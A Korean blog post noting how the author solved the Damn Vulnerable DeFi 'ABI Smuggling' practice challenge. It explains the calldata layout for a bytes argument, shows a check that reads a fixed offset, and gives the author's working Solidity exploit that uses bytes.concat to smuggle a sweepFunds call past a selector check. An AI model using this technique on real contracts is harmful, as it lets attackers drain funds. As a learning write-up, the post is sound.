---
title: Solidity Attack Vector - ABI Smuggling 
date: 2025-12-09 15:00:00 +0900
---

**DamnVulnerableDefi**에서 `ABI Smuggling` 문제를 풀면서 새롭게 적용해본 내용을 메모하기 위한 글이다.

[ABI Smuggling](https://www.damnvulnerabledefi.xyz/challenges/abi-smuggling/)

bytes배열을 인자로 받는 함수를 대상으로 call하면, 대강 이러한 구조로 구성되어 calldata가 넘어간다.

```text
- 함수: function execute(bytes calldata arg) external {}

- calldata:
0xdeadbeef                                                       (function signature)
0000000000000000000000000000000000000000000000000000000000000020 (length의 offset)
0000000000000000000000000000000000000000000000000000000000000040 (bytes데이터의 length)
00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff (bytes데이터)
00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff
```

그런데, 경우에 따라 calldata에 있는 내용을 파싱해 사용하면서, 조건검사를 제대로 하지 않아 calldata를 조작해 사용할 수 있는 경우도 생긴다. 위의 ABI-Smuggling 문제도 이러한 경우였다. 

예컨데, `bytes데이터`부분의 조건 검사를 그저 오프셋을 이용해서만 검사한다면, 아래와 같이 우회할 수 있다. 
아래와 같이 **오프셋**을 통해서만 검사한다고 하면,

```js

...

address to_check;
assembly {
    to_check = calldataload(4+32+32)
}
check_address(to_check);

...
```

아래의 방법을 통해 공격을 할 수 있다. 
```text
- 함수: function execute(bytes calldata arg) external {}

- calldata:
0xdeadbeef                                                       (function signature)
00000000000000000000000000000000000000000000000000000000000000a0 (length의 offset)
0000000000000000000000000000000000000000000000000000000000000040 (bytes데이터의 length)
00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff (bytes데이터...1)
00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff (bytes데이터...2)
0000000000000000000000000000000000000000000000000000000000000040 (비정상 데이터의 length)
00000000 ...           <Malicious Data>             ... 00000000 (비정상 데이터)
00000000 ...           <Malicious Data>             ... 00000000 (비정상 데이터)
```

이렇게 payload를 전송하게 되면, 실제로 컨트랙트에서 `arg`라는 bytes 배열을 참조할 때 그 **길이와 데이터 모두를 변조**할 수 있는, 굉장한 공격을 할 수 있게 된다.

solidity에서 이를 가장 쉽게 할 수 있는 방법은 (본인이 생각하기에) `bytes.concat`을 활용하는 것이다. 

일반적으로, `abi.encode` / `abi.encodePacked` / `abi.encodeWithSelector`등 abi 포맷팅 함수는 오프셋, 길이 등에 대한 데이터를 자체적으로 붙여주기 때문에, 이를 통해 bytes배열을 세부적으로 만지기는 쉽지 않다. 
때문에, bytes배열에 대한 메타데이터를 신경쓰지 않고 마음대로 정보를 추가하기 위해서는 `bytes.concat()`이 가장 좋은 듯 하다. 

아래는 필자가 DamnVulnerableDefi 문제를 풀 때 실제로 작성한 코드 예시이다. 
```js
bytes memory actionData = abi.encodeWithSelector(
    AuthorizedExecutor.execute.selector,
    address(vault)
);
actionData = bytes.concat(
    actionData, 
    bytes32(uint256(0x80)),
    bytes32(uint256(0x00)),
    SelfAuthorizedVault.withdraw.selector,
    bytes28(0x00),
    bytes32(uint256(0x44)),
    SelfAuthorizedVault.sweepFunds.selector,
    bytes32(uint256(uint160(recovery))),
    bytes32(uint256(uint160(address(token))))
);
(bool suc,) = address(vault).call(actionData);
```

뭔가 soldity같은 high-level언어에서 이렇게 low level데이터를 조작하는게 재미있는 것 같다. 